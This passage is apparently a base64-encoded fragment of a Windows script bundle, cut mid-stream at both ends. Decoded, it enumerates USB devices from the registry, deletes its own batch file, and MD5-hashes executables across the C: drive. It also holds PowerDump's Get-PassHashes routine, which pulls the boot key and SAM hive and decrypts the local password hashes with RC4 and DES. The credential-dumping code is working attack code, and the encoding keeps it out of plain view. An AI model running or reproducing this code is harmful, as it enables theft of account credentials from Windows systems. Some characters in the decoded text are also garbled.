ZXJhdGlvbjM5MjEyNTI4MSIKCQkJCSkKCQkJKQoJCSkKCSkyPm51bAopMj5udWwKZm9yIC9mICUlQSBpbiAoJ3JlZyBxdWVyeSBoa2xtXHN5c3RlbVxjdXJyZW50Y29udHJvbHNldFxlbnVtXHVzYnN0b3InKSBETyAoCQoJZm9yIC9mICUlQiBJTiAoJ3JlZyBxdWVyeSAiJSVBIicpIERPICgJCgkJZm9yIC9mICAidG9rZW5zPTEtMioiICUlQyBJTiAoJ3JlZyBxdWVyeSAiJSVCIiAvdiBGcmllbmRseU5hbWUnKSBETyAoCgkJCXNldCBGcmllbmRseU5hbWU9JSVFCgkJCUlGICIhRnJpZW5kbHlOYW1lISIgTkVRICIiIHNldCBGcmllbmRseU5hbWU9IUZyaWVuZGx5TmFtZTosPSEKCQkpMj5udWwKCQlmb3IgL2YgICJ0b2tlbnM9MS0yKiIgJSVDIElOICgncmVnIHF1ZXJ5ICIlJUIiIC92IERldmljZURlc2MnKSBETyAoCQoJCQlzZXQgRGV2aWNlRGVzY3I9JSVFCgkJCUlGICIhRGV2aWNlRGVzY3IhIiBORVEgIiIgc2V0IERldmljZURlc2NyPSFEZXZpY2VEZXNjcjosPSEKCQkpMj5udWwKCQlJRiAiJSVCIiBORVEgIiIgKAoJCQlJRiAiIURldmljZURlc2NyISIgTkVRICIiICgKCQkJCWVjaG8gJUNPTVBVVEVSTkFNRSUsIURldmljZURlc2NyISwhRnJpZW5kbHlOYW1lISwlJUIgPj4gIkM6XFVTQl9FbnVtZXJhdGlvbjM5MjEyNTI4MSIKCQkJKSBFTFNFICgKCQkJCUlGICIhRnJpZW5kbHlOYW1lISIgTkVRICIiICgKCQkJCQllY2hvICVDT01QVVRFUk5BTUUlLCFEZXZpY2VEZXNjciEsIUZyaWVuZGx5TmFtZSEsJSVCID4+ICJDOlxVU0JfRW51bWVyYXRpb24zOTIxMjUyODEiCgkJCQkpCgkJCSkKCQkpCgkpMj5udWwKKTI+bnVsCmVuZGxvY2FsCihnb3RvKSAyPm51bCAmIGRlbCAiJX5mMCIKJ0AKJFVTQl9FbnVtZXJhdGlvbkNvZGVfUFMxID0gQCcKJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9IFN0b3AKaWYgKFRlc3QtUGF0aCAiQzpcVVNCX0VudW1lcmF0aW9uMzkyMTI1MjgxIil7UmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxVU0JfRW51bWVyYXRpb24zOTIxMjUyODEifQoka2V5cz1AKCkKcmVnIHF1ZXJ5IGhrbG1cc3lzdGVtIHwgU2VsZWN0LVN0cmluZyAiY29udHJvbCIgfCAlewogICAgcmVnIHF1ZXJ5ICIkX1xlbnVtXHVzYiJ8d2hlcmV7JF99fCV7CiAgICAgICAgJGtleXMgKz0gcmVnIHF1ZXJ5ICRfIHx3aGVyZXskX30KICAgIH0KCXJlZyBxdWVyeSAiJF9cZW51bVx1c2JzdG9yInx3aGVyZXskX318JXsKICAgICAgICAka2V5cyArPSByZWcgcXVlcnkgJF8gfHdoZXJleyRffQogICAgfQp9CiRrZXlzfCV7CiAgICAka2V5ID0gJF8gLXJlcGxhY2UgIkhLRVlfTE9DQUxfTUFDSElORSIsICJIS0xNOiIgCglpZiAoKEdldC1JdGVtIC1QYXRoICIka2V5IikucHJvcGVydHl8U2VsZWN0LVN0cmluZyBEZXZpY2VEZXNjKQoJewoJCSREZXZEZXNjID0gKEdldC1JdGVtUHJvcGVydHkgLVBhdGggIiRrZXkiIC1OYW1lIERldmljZURlc2MpLkRldmljZURlc2MKCX0KCWVsc2UgeyREZXZEZXNjID0gIiJ9CglpZiAoKEdldC1JdGVtIC1QYXRoICIka2V5IikucHJvcGVydHl8U2VsZWN0LVN0cmluZyBGcmllbmRseU5hbWUpCgl7CgkJJEZyaWVuZGx5TmFtZSA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICIka2V5IiAtTmFtZSBGcmllbmRseU5hbWUpLkZyaWVuZGx5TmFtZSAKCX0KCWVsc2UgeyRGcmllbmRseU5hbWUgPSAiIn0KICAgIGlmICgkRGV2RGVzY3xzZWxlY3QtU3RyaW5nICI7Iil7JERldkRlc2MgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiJGtleSIgLU5hbWUgRGV2aWNlRGVzYykuRGV2aWNlRGVzYy5zcGxpdCgiOyIpWzFdfQoJaWYgKCRGcmllbmRseU5hbWV8c2VsZWN0LVN0cmluZyAiOyIpeyRGcmllbmRseU5hbWUgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiJGtleSIgLU5hbWUgRnJpZW5kbHlOYW1lKS5GcmllbmRseU5hbWUuc3BsaXQoIjsiKVsxXX0gICAgCglpZigkRGV2RGVzYyAtb3IgJEZyaWVuZGx5TmFtZSkKCXsKCQkkZW52OkNPTVBVVEVSTkFNRSsiLCIrJERldkRlc2MrIiwiKyRGcmllbmRseU5hbWUrIiwiKyRfIHwgQWRkLUNvbnRlbnQgIkM6XFVTQl9FbnVtZXJhdGlvbjM5MjEyNTI4MSIKCX0KfQpSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFBTRXhlY1NoZWxsQ29kZS5wczEiCidACgokRmlsZUhhc2hlciA9IEAnCmZ1bmN0aW9uIEdldEhhc2goJGZpbGUpewokZnMgPSBuZXctb2JqZWN0IFN5c3RlbS5JTy5GaWxlU3RyZWFtICRmaWxlLCDDouKCrMWTT3BlbsOi4oKsLCDDouKCrMWTUmVhZMOi4oKsLCDDouKCrMWTUmVhZMOi4oKsCiRhbGdvID0gW3R5cGVdIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1IgokY3J5cHRvID0gJGFsZ286OkNyZWF0ZSgpCiRoYXNoID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRjcnlwdG8uQ29tcHV0ZUhhc2goJGZzKSkuUmVwbGFjZSgiLSIsICIiKQojJGhhc2ggPSAkY3J5cHRvLkNvbXB1dGVIYXNoKCRmcykKJGZzLkNsb3NlKCkKJGhhc2gKfQoKR2V0LUNoaWxkSXRlbSAtcGF0aCAiQzpcIiAtSW5jbHVkZSAiKi5leGUiLCAiKi5kbGwiLCAiKi5zeXMiIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZXwKPyB7ICRfLkZ1bGxOYW1lIC1ub3RtYXRjaCAnQXBwbGljYXRpb24gRGF0YScgfXwgJXsgCgkkXy5OYW1lKyIsIisoR2V0SGFzaCAkXy5GdWxsTmFtZSl8QWRkLUNvbnRlbnQgICJDOlxoYXNoZXMzOTIxMjUyODEiCn0KUmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxQU0V4ZWNTaGVsbENvZGUucHMxIgonQAoKW1NjcmlwdEJsb2NrXSAkUG93ZXJEdW1wID0gewpmdW5jdGlvbiBHZXQtUGFzc0hhc2hlcyB7ICAKPCMgIApodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDEzLzA1L3Bvc2hpbmctaGFzaGVzLXBhcnQtMi5odG1sP3Nob3dDb21tZW50PTEzODY3MjU4NzQxNjcjYzg1MTM5ODA3MjU4MjM3NjQwNjAgCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nIAojPiAgCltDbWRsZXRCaW5kaW5nKCldIApQYXJhbSAoKSAKICAKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjcG93ZXJkdW1wIHdyaXR0ZW4gYnkgRGF2aWQgS2VubmVkeSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIApmdW5jdGlvbiBMb2FkQXBpIAp7IAokb2xkRXJyb3JBY3Rpb24gPSAkZ2xvYmFsOkVycm9yQWN0aW9uUHJlZmVyZW5jZTsgCiRnbG9iYWw6RXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gIlNpbGVudGx5Q29udGludWUiOyAKJHRlc3QgPSBbUG93ZXJEdW1wLk5hdGl2ZV07IAokZ2xvYmFsOkVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICRvbGRFcnJvckFjdGlvbjsgCmlmICgkdGVzdCkgCnsgCiMgYWxyZWFkeSBsb2FkZWQgCnJldHVybjsgCn0gCiAgCiRjb2RlID0gQCcgCnVzaW5nIFN5c3RlbTsgCnVzaW5nIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHk7IAp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7IAp1c2luZyBTeXN0ZW0uVGV4dDsgCiAKbmFtZXNwYWNlIFBvd2VyRHVtcCAKeyAKcHVibGljIGNsYXNzIE5hdGl2ZSAKeyAKW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldIApwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVnT3BlbktleUV4KCAKaW50IGhLZXksIApzdHJpbmcgc3ViS2V5LCAKaW50IHVsT3B0aW9ucywgCmludCBzYW1EZXNpcmVkLCAKb3V0IGludCBoa1Jlc3VsdCk7IAogCltEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEVudHJ5UG9pbnQgPSAiUmVnRW51bUtleUV4IildIApleHRlcm4gcHVibGljIHN0YXRpYyBpbnQgUmVnRW51bUtleUV4KCAKaW50IGhrZXksIAppbnQgaW5kZXgsIApTdHJpbmdCdWlsZGVyIGxwTmFtZSwgCnJlZiBpbnQgbHBjYk5hbWUsIAppbnQgcmVzZXJ2ZWQsIApTdHJpbmdCdWlsZGVyIGxwQ2xhc3MsIApyZWYgaW50IGxwY2JDbGFzcywgCm91dCBsb25nIGxwZnRMYXN0V3JpdGVUaW1lKTsgCiAKW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludD0iUmVnUXVlcnlJbmZvS2V5IiwgQ2FsbGluZ0NvbnZlbnRpb249Q2FsbGluZ0NvbnZlbnRpb24uV2luYXBpLCBTZXRMYXN0RXJyb3I9dHJ1ZSldIApleHRlcm4gcHVibGljIHN0YXRpYyBpbnQgUmVnUXVlcnlJbmZvS2V5KCAKaW50IGhrZXksIApTdHJpbmdCdWlsZGVyIGxwQ2xhc3MsIApyZWYgaW50IGxwY2JDbGFzcywgCmludCBscFJlc2VydmVkLCAKb3V0IGludCBscGNTdWJLZXlzLCAKb3V0IGludCBscGNiTWF4U3ViS2V5TGVuLCAKb3V0IGludCBscGNiTWF4Q2xhc3NMZW4sIApvdXQgaW50IGxwY1ZhbHVlcywgCm91dCBpbnQgbHBjYk1heFZhbHVlTmFtZUxlbiwgCm91dCBpbnQgbHBjYk1heFZhbHVlTGVuLCAKb3V0IGludCBscGNiU2VjdXJpdHlEZXNjcmlwdG9yLCAKSW50UHRyIGxwZnRMYXN0V3JpdGVUaW1lKTsgCiAgCltEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0gCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBSZWdDbG9zZUtleSggCmludCBoS2V5KTsgCiAgCn0gCn0gLy8gZW5kIG5hbWVzcGFjZSBQb3dlckR1bXAgCiAgCnB1YmxpYyBjbGFzcyBTaGlmdCB7IApwdWJsaWMgc3RhdGljIGludCBSaWdodChpbnQgeCwgaW50IGNvdW50KSB7IHJldHVybiB4ID4+IGNvdW50OyB9IApwdWJsaWMgc3RhdGljIHVpbnQgUmlnaHQodWludCB4LCBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0gCnB1YmxpYyBzdGF0aWMgbG9uZyBSaWdodChsb25nIHgsIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfSAKcHVibGljIHN0YXRpYyB1bG9uZyBSaWdodCh1bG9uZyB4LCBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0gCnB1YmxpYyBzdGF0aWMgaW50IExlZnQoaW50IHgsIGludCBjb3VudCkgeyByZXR1cm4geCA8PCBjb3VudDsgfSAKcHVibGljIHN0YXRpYyB1aW50IExlZnQodWludCB4LCBpbnQgY291bnQpIHsgcmV0dXJuIHggPDwgY291bnQ7IH0gCnB1YmxpYyBzdGF0aWMgbG9uZyBMZWZ0KGxvbmcgeCwgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9IApwdWJsaWMgc3RhdGljIHVsb25nIExlZnQodWxvbmcgeCwgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9IAp9CidAIAogIAokcHJvdmlkZXIgPSBOZXctT2JqZWN0IE1pY3Jvc29mdC5DU2hhcnAuQ1NoYXJwQ29kZVByb3ZpZGVyIAokZGxsTmFtZSA9IFtQc09iamVjdF0uQXNzZW1ibHkuTG9jYXRpb24gCiRjb21waWxlclBhcmFtZXRlcnMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2RlRG9tLkNvbXBpbGVyLkNvbXBpbGVyUGFyYW1ldGVycyAKJGFzc2VtYmxpZXMgPSBAKCJTeXN0ZW0uZGxsIiwgJGRsbE5hbWUpIAokY29tcGlsZXJQYXJhbWV0ZXJzLlJlZmVyZW5jZWRBc3NlbWJsaWVzLkFkZFJhbmdlKCRhc3NlbWJsaWVzKSAKJGNvbXBpbGVyUGFyYW1ldGVycy5HZW5lcmF0ZUluTWVtb3J5ID0gJHRydWUgCiRjb21waWxlclJlc3VsdHMgPSAkcHJvdmlkZXIuQ29tcGlsZUFzc2VtYmx5RnJvbVNvdXJjZSgkY29tcGlsZXJQYXJhbWV0ZXJzLCAkY29kZSkgCmlmKCRjb21waWxlclJlc3VsdHMuRXJyb3JzLkNvdW50IC1ndCAwKSB7IAokY29tcGlsZXJSZXN1bHRzLkVycm9ycyB8ICUgeyBXcml0ZS1FcnJvciAoInswfTpgdHsxfSIgLWYgJF8uTGluZSwkXy5FcnJvclRleHQpIH0gCn0gCiAgCn0gCiAgCiRhbnRwYXNzd29yZCA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIk5UUEFTU1dPUkRgMCIpOyAKJGFsbXBhc3N3b3JkID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiTE1QQVNTV09SRGAwIik7IAokZW1wdHlfbG0gPSBbYnl0ZVtdXUAoMHhhYSwweGQzLDB4YjQsMHgzNSwweGI1LDB4MTQsMHgwNCwweGVlLDB4YWEsMHhkMywweGI0LDB4MzUsMHhiNSwweDE0LDB4MDQsMHhlZSk7IAokZW1wdHlfbnQgPSBbYnl0ZVtdXUAoMHgzMSwweGQ2LDB4Y2YsMHhlMCwweGQxLDB4NmEsMHhlOSwweDMxLDB4YjcsMHgzYywweDU5LDB4ZDcsMHhlMCwweGMwLDB4ODksMHhjMCk7IAokb2RkX3Bhcml0eSA9IEAoIAoxLCAxLCAyLCAyLCA0LCA0LCA3LCA3LCA4LCA4LCAxMSwgMTEsIDEzLCAxMywgMTQsIDE0LCAKMTYsIDE2LCAxOSwgMTksIDIxLCAyMSwgMjIsIDIyLCAyNSwgMjUsIDI2LCAyNiwgMjgsIDI4LCAzMSwgMzEsIAozMiwgMzIsIDM1LCAzNSwgMzcsIDM3LCAzOCwgMzgsIDQxLCA0MSwgNDIsIDQyLCA0NCwgNDQsIDQ3LCA0NywgCjQ5LCA0OSwgNTAsIDUwLCA1MiwgNTIsIDU1LCA1NSwgNTYsIDU2LCA1OSwgNTksIDYxLCA2MSwgNjIsIDYyLCAKNjQsIDY0LCA2NywgNjcsIDY5LCA2OSwgNzAsIDcwLCA3MywgNzMsIDc0LCA3NCwgNzYsIDc2LCA3OSwgNzksIAo4MSwgODEsIDgyLCA4MiwgODQsIDg0LCA4NywgODcsIDg4LCA4OCwgOTEsIDkxLCA5MywgOTMsIDk0LCA5NCwgCjk3LCA5NywgOTgsIDk4LDEwMCwxMDAsMTAzLDEwMywxMDQsMTA0LDEwNywxMDcsMTA5LDEwOSwxMTAsMTEwLCAKMTEyLDExMiwxMTUsMTE1LDExNywxMTcsMTE4LDExOCwxMjEsMTIxLDEyMiwxMjIsMTI0LDEyNCwxMjcsMTI3LCAKMTI4LDEyOCwxMzEsMTMxLDEzMywxMzMsMTM0LDEzNCwxMzcsMTM3LDEzOCwxMzgsMTQwLDE0MCwxNDMsMTQzLCAKMTQ1LDE0NSwxNDYsMTQ2LDE0OCwxNDgsMTUxLDE1MSwxNTIsMTUyLDE1NSwxNTUsMTU3LDE1NywxNTgsMTU4LCAKMTYxLDE2MSwxNjIsMTYyLDE2NCwxNjQsMTY3LDE2NywxNjgsMTY4LDE3MSwxNzEsMTczLDE3MywxNzQsMTc0LCAKMTc2LDE3NiwxNzksMTc5LDE4MSwxODEsMTgyLDE4MiwxODUsMTg1LDE4NiwxODYsMTg4LDE4OCwxOTEsMTkxLCAKMTkzLDE5MywxOTQsMTk0LDE5NiwxOTYsMTk5LDE5OSwyMDAsMjAwLDIwMywyMDMsMjA1LDIwNSwyMDYsMjA2LCAKMjA4LDIwOCwyMTEsMjExLDIxMywyMTMsMjE0LDIxNCwyMTcsMjE3LDIxOCwyMTgsMjIwLDIyMCwyMjMsMjIzLCAKMjI0LDIyNCwyMjcsMjI3LDIyOSwyMjksMjMwLDIzMCwyMzMsMjMzLDIzNCwyMzQsMjM2LDIzNiwyMzksMjM5LCAKMjQxLDI0MSwyNDIsMjQyLDI0NCwyNDQsMjQ3LDI0NywyNDgsMjQ4LDI1MSwyNTEsMjUzLDI1MywyNTQsMjU0IAopOyAKIApmdW5jdGlvbiBzaWRfdG9fa2V5KCRzaWQpIAp7IAokczEgPSBAKCk7IAokczEgKz0gW2NoYXJdKCRzaWQgLWJhbmQgMHhGRik7IAokczEgKz0gW2NoYXJdKFtTaGlmdF06OlJpZ2h0KCRzaWQsOCkgLWJhbmQgMHhGRik7IAokczEgKz0gW2NoYXJdKFtTaGlmdF06OlJpZ2h0KCRzaWQsMTYpIC1iYW5kIDB4RkYpOyAKJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDI0KSAtYmFuZCAweEZGKTsgCiRzMSArPSAkczFbMF07IAokczEgKz0gJHMxWzFdOyAKJHMxICs9ICRzMVsyXTsgCiRzMiA9IEAoKTsgCiRzMiArPSAkczFbM107ICRzMiArPSAkczFbMF07ICRzMiArPSAkczFbMV07ICRzMiArPSAkczFbMl07IAokczIgKz0gJHMyWzBdOyAkczIgKz0gJHMyWzFdOyAkczIgKz0gJHMyWzJdOyAKcmV0dXJuICwoKHN0cl90b19rZXkgJHMxKSwoc3RyX3RvX2tleSAkczIpKTsgCn0gCiAKZnVuY3Rpb24gc3RyX3RvX2tleSgkcykgCnsgCiRrZXkgPSBAKCk7IAoka2V5ICs9IFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzBdKSwgMSApOyAKJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzBdKSAtYmFuZCAweDAxKSwgNikgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1sxXSksMik7IAoka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbMV0pIC1iYW5kIDB4MDMpLCA1KSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzJdKSwzKTsgCiRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1syXSkgLWJhbmQgMHgwNyksIDQpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbM10pLDQpOyAKJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzNdKSAtYmFuZCAweDBGKSwgMykgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1s0XSksNSk7IAoka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbNF0pIC1iYW5kIDB4MUYpLCAyKSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzVdKSw2KTsgCiRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1s1XSkgLWJhbmQgMHgzRiksIDEpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbNl0pLDcpOyAKJGtleSArPSAkKFtpbnRdKCRzWzZdKSAtYmFuZCAweDdGKTsgCjAuLjcgfCAleyAKJGtleVskX10gPSBbU2hpZnRdOjpMZWZ0KCRrZXlbJF9dLCAxKTsgCiRrZXlbJF9dID0gJG9kZF9wYXJpdHlbJGtleVskX11dOyAKfSAKcmV0dXJuICwka2V5OyAKfSAKIApmdW5jdGlvbiBOZXdSQzQoW2J5dGVbXV0ka2V5KSAKeyAKcmV0dXJuIG5ldy1vYmplY3QgT2JqZWN0IHwgCkFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IGtleSAka2V5IC1QYXNzVGhydSB8IApBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSBTICRudWxsIC1QYXNzVGhydSB8IApBZGQtTWVtYmVyIFNjcmlwdE1ldGhvZCBpbml0IHsgCmlmICgtbm90ICR0aGlzLlMpIAp7IApbYnl0ZVtdXSR0aGlzLlMgPSAwLi4yNTU7IAowLi4yNTUgfCAlIC1iZWdpbntbbG9uZ10kaj0wO317IAokaiA9ICgkaiArICR0aGlzLmtleVskKCRfICUgJHRoaXMua2V5Lkxlbmd0aCldICsgJHRoaXMuU1skX10pICUgJHRoaXMuUy5MZW5ndGg7IAokdGVtcCA9ICR0aGlzLlNbJF9dOyAkdGhpcy5TWyRfXSA9ICR0aGlzLlNbJGpdOyAkdGhpcy5TWyRqXSA9ICR0ZW1wOyAKfSAKfSAKfSAtUGFzc1RocnUgfCAKQWRkLU1lbWJlciBTY3JpcHRNZXRob2QgImVuY3J5cHQiIHsgCiRkYXRhID0gJGFyZ3NbMF07IAokdGhpcy5pbml0KCk7IAokb3V0YnVmID0gbmV3LW9iamVjdCBieXRlW10gJCgkZGF0YS5MZW5ndGgpOyAKJFMyID0gJHRoaXMuU1swLi4kdGhpcy5TLkxlbmd0aF07IAowLi4kKCRkYXRhLkxlbmd0aC0xKSB8ICUgLWJlZ2lueyRpPTA7JGo9MDt9IHsgCiRpID0gKCRpKzEpICUgJFMyLkxlbmd0aDsgCiRqID0gKCRqICsgJFMyWyRpXSkgJSAkUzIuTGVuZ3RoOyAKJHRlbXAgPSAkUzJbJGldOyRTMlskaV0gPSAkUzJbJGpdOyRTMlskal0gPSAkdGVtcDsgCiRhID0gJGRhdGFbJF9dOyAKJGIgPSAkUzJbICQoJFMyWyRpXSskUzJbJGpdKSAlICRTMi5MZW5ndGggXTsgCiRvdXRidWZbJF9dID0gKCRhIC1ieG9yICRiKTsgCn0gCnJldHVybiAsJG91dGJ1ZjsgCn0gLVBhc3NUaHJ1IAp9IAogCmZ1bmN0aW9uIGRlc19lbmNyeXB0KFtieXRlW11dJGRhdGEsIFtieXRlW11dJGtleSkgCnsgCnJldHVybiAsKGRlc190cmFuc2Zvcm0gJGRhdGEgJGtleSAkdHJ1ZSkgCn0gCiAKZnVuY3Rpb24gZGVzX2RlY3J5cHQoW2J5dGVbXV0kZGF0YSwgW2J5dGVbXV0ka2V5KSAKeyAKcmV0dXJuICwoZGVzX3RyYW5zZm9ybSAkZGF0YSAka2V5ICRmYWxzZSkgCn0gCiAKZnVuY3Rpb24gZGVzX3RyYW5zZm9ybShbYnl0ZVtdXSRkYXRhLCBbYnl0ZVtdXSRrZXksICRkb0VuY3J5cHQpIAp7IAokZGVzID0gbmV3LW9iamVjdCBTZWN1cml0eS5DcnlwdG9ncmFwaHkuREVTQ3J5cHRvU2VydmljZVByb3ZpZGVyOyAKJGRlcy5Nb2RlID0gW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6RUNCOyAKJGRlcy5QYWRkaW5nID0gW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06Ok5vbmU7IAokZGVzLktleSA9ICRrZXk7IAokZGVzLklWID0gJGtleTsgCiR0cmFuc2Zvcm0gPSAkbnVsbDsgCmlmICgkZG9FbmNyeXB0KSB7JHRyYW5zZm9ybSA9ICRkZXMuQ3JlYXRlRW5jcnlwdG9yKCk7fSAKZWxzZXskdHJhbnNmb3JtID0gJGRlcy5DcmVhdGVEZWNyeXB0b3IoKTt9IAokcmVzdWx0ID0gJHRyYW5zZm9ybS5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRkYXRhLCAwLCAkZGF0YS5MZW5ndGgpOyAKcmV0dXJuICwkcmVzdWx0OyAKfSAKIApmdW5jdGlvbiBHZXQtUmVnS2V5Q2xhc3MoW3N0cmluZ10ka2V5LCBbc3RyaW5nXSRzdWJrZXkpIAp7IApzd2l0Y2ggKCRLZXkpIHsgCiJIS0NSIiB7ICRuS2V5ID0gMHg4MDAwMDAwMH0gI0hLIENsYXNzZXMgUm9vdCAKIkhLQ1UiIHsgJG5LZXkgPSAweDgwMDAwMDAxfSAjSEsgQ3VycmVudCBVc2VyIAoiSEtMTSIgeyAkbktleSA9IDB4ODAwMDAwMDJ9ICNISyBMb2NhbCBNYWNoaW5lIAoiSEtVIiB7ICRuS2V5ID0gMHg4MDAwMDAwM30gI0hLIFVzZXJzIAoiSEtDQyIgeyAkbktleSA9IDB4ODAwMDAwMDV9ICNISyBDdXJyZW50IENvbmZpZyAKZGVmYXVsdCB7IAp0aHJvdyAiSW52YWxpZCBLZXkuIFVzZSBvbmUgb2YgdGhlIGZvbGxvd2luZyBvcHRpb25zIEhLQ1IsIEhLQ1UsIEhLTE0sIEhLVSwgSEtDQyIgCn0gCn0gCiRLRVlRVUVSWVZBTFVFID0gMHgxOyAKJEtFWVJFQUQgPSAweDE5OyAKJEtFWUFMTEFDQ0VTUyA9IDB4M0Y7IAokcmVzdWx0ID0gIiI7IApbaW50XSRoa2V5PTAgCmlmICgtbm90IFtQb3dlckR1bXAuTmF0aXZlXTo6UmVnT3BlbktleUV4KCRua2V5LCRzdWJrZXksMCwkS0VZUkVBRCxbcmVmXSRoa2V5KSkgCnsgCiRjbGFzc1ZhbCA9IE5ldy1PYmplY3QgVGV4dC5TdHJpbmdidWlsZGVyIDEwMjQgCltpbnRdJGxlbiA9IDEwMjQgCmlmICgtbm90IFtQb3dlckR1bXAuTmF0aXZlXTo6UmVnUXVlcnlJbmZvS2V5KCRoa2V5LCRjbGFzc1ZhbCxbcmVmXSRsZW4sMCxbcmVmXSRudWxsLFtyZWZdJG51bGwsIApbcmVmXSRudWxsLFtyZWZdJG51bGwsW3JlZl0kbnVsbCxbcmVmXSRudWxsLFtyZWZdJG51bGwsMCkpIAp7IAokcmVzdWx0ID0gJGNsYXNzVmFsLlRvU3RyaW5nKCkgCn0gCgpbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ0Nsb3NlS2V5KCRoa2V5KSB8IE91dC1OdWxsIAp9IAoKcmV0dXJuICRyZXN1bHQ7IAp9IAogCmZ1bmN0aW9uIEdldC1Cb290S2V5IAp7IAokcyA9IFtzdHJpbmddOjpKb2luKCIiLCQoIkpEIiwiU2tldzEiLCJHQkciLCJEYXRhIiB8ICV7R2V0LVJlZ0tleUNsYXNzICJIS0xNIiAiU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcTHNhXCRfIn0pKTsgCiRiID0gbmV3LW9iamVjdCBieXRlW10gJCgkcy5MZW5ndGgvMik7IAowLi4kKCRiLkxlbmd0aC0xKSB8ICV7JGJbJF9dID0gW0NvbnZlcnRdOjpUb0J5dGUoJHMuU3Vic3RyaW5nKCQoJF8qMiksMiksMTYpfSAKJGIyID0gbmV3LW9iamVjdCBieXRlW10gMTY7IAoweDgsIDB4NSwgMHg0LCAweDIsIDB4YiwgMHg5LCAweGQsIDB4MywgMHgwLCAweDYsIDB4MSwgMHhjLCAweGUsIDB4YSwgMHhmLCAweDcgfCAlIC1iZWdpbnskaT0wO317JGIyWyRpXT0kYlskX107JGkrK30gCnJldHVybiAsJGIyOyAKfSAKIApmdW5jdGlvbiBHZXQtSEJvb3RLZXkgCnsgCnBhcmFtKFtieXRlW11dJGJvb3RrZXkpOyAKJGFxd2VydHkgPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCIhQCMkJV4mKigpcXdlcnR5VUlPUEF6eGN2Ym5tUVFRUVFRUVFRUVFRKSgqQCYlYDAiKTsgCiRhbnVtID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiMDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OWAwIik7IAokayA9IEdldC1JdGVtIEhLTE06XFNBTVxTQU1cRG9tYWluc1xBY2NvdW50OyAKaWYgKC1ub3QgJGspIHtyZXR1cm4gJG51bGx9IApbYnl0ZVtdXSRGID0gJGsuR2V0VmFsdWUoIkYiKTsgCmlmICgtbm90ICRGKSB7cmV0dXJuICRudWxsfSAKJHJjNGtleSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goJEZbMHg3MC4uMHg3Rl0gKyAkYXF3ZXJ0eSArICRib290a2V5ICsgJGFudW0pOyAKJHJjNCA9IE5ld1JDNCAkcmM0a2V5OyAKcmV0dXJuICwoJHJjNC5lbmNyeXB0KCRGWzB4ODAuLjB4OUZdKSk7IAp9IAogCmZ1bmN0aW9uIEdldC